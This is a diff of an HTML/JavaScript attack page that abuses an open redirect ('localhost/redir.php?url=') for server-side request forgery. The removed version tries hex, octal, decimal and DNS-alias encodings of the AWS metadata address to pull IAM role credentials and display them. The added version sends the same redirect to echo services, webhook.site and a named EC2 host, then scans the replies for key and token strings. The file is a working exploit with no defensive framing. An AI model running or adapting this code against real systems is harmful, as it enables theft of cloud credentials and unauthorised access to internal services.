@@ -1,88 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AWS Metadata IP Bypass</title>
+    <title>External Reflection Attack</title>
 </head>
 <body>
-    <h1>☁️ AWS Metadata Service IP Bypass</h1>
+    <h1>🪞 External Service Reflection Attack</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Alternative representations of 169.254.169.254 (AWS metadata IP)
-        var metadataIPs = [
-            // Standard
-            '169.254.169.254',
+        // Since external requests work, use services that might reflect internal info
+        var reflectionServices = [
+            // Services that reflect headers (might show internal environment)
+            'http://httpbin.org/headers',
+            'http://httpbin.org/anything',
+            'http://httpbin.org/anything/test',
+            'http://postman-echo.com/get',
+            'http://postman-echo.com/headers',
             
-            // Hex representations of 169.254.169.254
-            '0xa9.0xfe.0xa9.0xfe',
-            '0xa9fea9fe',           // Full hex
+            // Services that might trigger different behavior
+            'http://httpbin.org/status/500',
+            'http://httpbin.org/delay/1',
+            'http://httpbin.org/redirect/1',
             
-            // Octal representations
-            '0251.0376.0251.0376',   // Full octal
+            // Try to access webhook services (might reveal IP/environment)
+            'http://webhook.site/unique-id',
+            'http://requestbin.com',
             
-            // Decimal representation  
-            '2852039166',            // 169.254.169.254 as decimal
+            // Try to trigger error messages that might leak info
+            'http://httpbin.org/status/404',
+            'http://httpbin.org/xml',
+            'http://httpbin.org/html',
             
-            // Mixed representations
-            '169.254.169.0xfe',      // Mixed decimal/hex
-            '169.0376.169.254',      // Mixed decimal/octal
+            // Test different protocols if supported
+            'https://httpbin.org/get',
+            'https://httpbin.org/headers',
             
-            // Alternative formats
-            '169.254.169.254.xip.io',
-            '169.254.169.254.nip.io',
+            // Try FTP if supported (might reveal more info)
+            'ftp://httpbin.org',
             
-            // URL encoding bypass attempts
-            'http%3A%2F%2F169.254.169.254',
+            // Try different ports on httpbin.org
+            'http://httpbin.org:8080/',
+            'http://httpbin.org:443/',
             
-            // Try if it responds to different hostnames
-            'metadata',
-            'metadata.amazonaws.com',
-            'instance-data',
-            'ec2metadata'
+            // Test internal domains that might be accessible externally
+            'http://metadata.amazonaws.com',
+            'http://169.254.169.254.amazonaws.com',
+            
+            // Check if we can reach other AWS services
+            'http://s3.amazonaws.com',
+            'http://ec2.amazonaws.com',
+            
+            // Try to access the target server from external perspective
+            'http://54.209.100.76.amazonaws.com',
+            'http://ec2-54-209-100-76.compute-1.amazonaws.com'
         ];
         
-        for(var i = 0; i < metadataIPs.length; i++) {
+        for(var i = 0; i < reflectionServices.length; i++) {
             try {
-                results += "<h3>🔍 Testing AWS Metadata: " + metadataIPs[i] + "</h3>";
+                results += "<h3>🪞 " + reflectionServices[i] + "</h3>";
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'http://localhost/redir.php?url=' + reflectionServices[i], false);
+                xhr.send();
                 
-                // Test metadata root
-                var xhr1 = new XMLHttpRequest();
-                xhr1.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/', false);
-                xhr1.send();
-                
-                if(xhr1.responseText && xhr1.responseText.trim().length > 0) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>🎯 METADATA ACCESS: " + metadataIPs[i] + " (" + xhr1.responseText.length + " bytes)</div>";
-                    results += "<div style='background:#f0f0f0;padding:10px;font-size:11px;'>" + xhr1.responseText + "</div>";
+                if(xhr.responseText && xhr.responseText.length > 10) {
+                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>📡 RESPONSE: " + xhr.responseText.length + " bytes</div>";
                     
-                    // If metadata root works, try IAM credentials immediately
-                    try {
-                        var xhr2 = new XMLHttpRequest();
-                        xhr2.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/iam/security-credentials/', false);
-                        xhr2.send();
-                        
-                        if(xhr2.responseText && xhr2.responseText.trim().length > 0) {
-                            results += "<div style='background:#74c0fc;padding:8px;'>🔑 IAM ROLE FOUND: " + xhr2.responseText + "</div>";
-                            
-                            // Get the actual credentials
-                            var roleName = xhr2.responseText.trim();
-                            var xhr3 = new XMLHttpRequest();
-                            xhr3.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/iam/security-credentials/' + roleName, false);
-                            xhr3.send();
-                            
-                            results += "<div style='background:#ff6b6b;color:white;padding:10px;border:3px solid red;'>🚨 AWS CREDENTIALS EXTRACTED! 🚨</div>";
-                            results += "<div style='background:#f0f0f0;padding:10px;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr3.responseText + "</div>";
-                        }
-                    } catch(e2) {
-                        results += "<div style='background:#ffeaa7;padding:3px;'>⚠️ IAM access failed</div>";
+                    // Look for AWS-related information in response
+                    var text = xhr.responseText.toLowerCase();
+                    if(text.includes('aws') || text.includes('amazon') || text.includes('ec2') || text.includes('s3')) {
+                        results += "<div style='background:#ff6b6b;color:white;padding:5px;'>🚨 AWS KEYWORDS DETECTED! 🚨</div>";
                     }
                     
+                    // Look for credential-like strings
+                    if(text.includes('key') || text.includes('secret') || text.includes('token') || text.includes('credential')) {
+                        results += "<div style='background:#ffa500;color:white;padding:5px;'>🔑 CREDENTIAL KEYWORDS FOUND!</div>";
+                    }
+                    
+                    results += "<div style='background:#f0f0f0;padding:8px;max-height:100px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "</div>";
                 } else {
-                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No metadata response</div>";
+                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No significant response</div>";
                 }
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:3px;'>❌ Failed: " + e.message.substring(0, 50) + "</div>";
+                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 50) + "</div>";
             }
         }
         
